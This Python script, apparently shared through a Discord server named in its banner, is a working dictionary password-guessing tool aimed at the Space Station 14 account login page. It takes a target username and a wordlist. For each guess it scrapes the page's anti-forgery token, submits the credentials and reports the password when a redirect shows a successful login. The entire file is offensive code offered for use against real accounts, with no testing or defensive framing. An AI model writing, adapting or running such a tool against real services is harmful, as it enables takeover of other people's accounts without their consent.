import requests
from bs4 import BeautifulSoup
import shutil
import sys
import time

art = r"""
  __                       _   
 / _| ___  _ __ __ _  ___ | |_ 
| |_ / _ \| '__/ _` |/ _ \| __|
|  _| (_) | | | (_| | (_) | |_ 
|_|  \___/|_|  \__, |\___/ \__|
               |___/           
https://discord.gg/5z9hdquRfF
"""

width = shutil.get_terminal_size().columns
for line in art.splitlines():
    print(line.center(width))

def main():
    try:
        ckey = input("[+] CKEY: ")
        path = input("[+] FULL PATH TO DICT: ")

        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0'}

        print("[~] Loading dictionary...")
        try:
            with open(path, 'r') as f:
                passwords = [p.strip() for p in f.readlines() if p.strip()]
        except FileNotFoundError:
            print("[!] Dictionary file not found!")
            return
            
        if not passwords:
            print("[!] No valid passwords found in dictionary")
            return
            
        print(f"[+] Loaded {len(passwords)} passwords")
        
        for idx, password in enumerate(passwords, 1):
            try:
                sys.stdout.write(f"\r[*] Trying ({idx}/{len(passwords)}): {password[:20]}{' ' * 10}")
                sys.stdout.flush()

                login_page = session.get(
                    "https://account.spacestation14.com/Identity/Account/Login",
                    headers=headers
                )
                soup = BeautifulSoup(login_page.text, 'html.parser')
                token_tag = soup.find('input', {'name': '__RequestVerificationToken'})
                
                if not token_tag:
                    print("\n[!] Token not found! Check website structure")
                    return
                    
                token = token_tag['value']

                login_data = {
                    "Input.EmailOrUsername": ckey,
                    "Input.Password": password,
                    "Input.RememberMe": "false",
                    "__RequestVerificationToken": token
                }

                response = session.post(
                    "https://account.spacestation14.com/Identity/Account/Login",
                    data=login_data,
                    headers=headers,
                    allow_redirects=False,
                )

                if response.status_code == 302 and "Location" in response.headers:
                    if response.headers["Location"].endswith("/"):
                        print(f"\n[+] SUCCESS! Password found: {password}")
                        return
                
            except Exception as e:
                print(f"\n[!] Error on password '{password}': {str(e)}")
                time.sleep(1)
                continue
                
        print("\n[-] FAILED! Password not found in dictionary")
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")

if __name__ == '__main__': 
    main()